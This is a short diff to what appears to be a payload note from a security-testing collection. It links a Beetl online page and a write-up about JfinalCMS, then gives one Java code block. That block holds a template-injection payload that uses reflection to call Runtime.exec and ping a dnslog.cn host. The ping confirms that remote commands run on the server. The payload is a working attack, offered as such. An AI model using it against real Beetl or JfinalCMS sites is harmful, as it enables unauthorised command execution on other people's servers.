@@ -1,8 +1,10 @@
 http://ibeetl.com/beetlonline/
 
 
-JfinalCMS: ttps://xz.aliyun.com/t/8695
+JfinalCMS: https://xz.aliyun.com/t/8695
 
 ```java
 ${@java.lang.Class.forName("java.lang.Runtime").getMethod("exec",@java.lang.Class.forName("java.lang.String")).invoke(@java.lang.Class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null),"ping 029bzv.dnslog.cn")}
+
+
 ```
